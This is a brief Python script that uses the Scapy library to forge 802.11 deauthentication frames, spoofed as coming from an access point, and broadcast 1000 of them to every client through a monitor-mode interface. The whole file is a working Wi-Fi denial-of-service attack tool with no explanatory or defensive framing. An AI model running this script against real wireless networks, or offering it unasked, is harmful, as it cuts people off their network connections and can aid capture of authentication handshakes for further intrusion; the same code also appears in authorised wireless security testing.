#!/usr/bin/env python3

from scapy.all import *

# Set interface, target client MAC, and AP MAC address
interface = "wlan0mon"
target_client = "FF:FF:FF:FF:FF:FF" # Broadcast deauth to all clients
ap_mac = "00:11:22:33:44:55"

def deauth(pkt_count):
    dot11 = Dot11(addr1=target_client, addr2=ap_mac, addr3=ap_mac)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, iface=interface, count=pkt_count, inter=0.1)
    print(f"[+] Sent {pkt_count} deauthentication frames to {target_client}")

if __name__ == "__main__":
    pkt_count = 1000
    deauth(pkt_count)
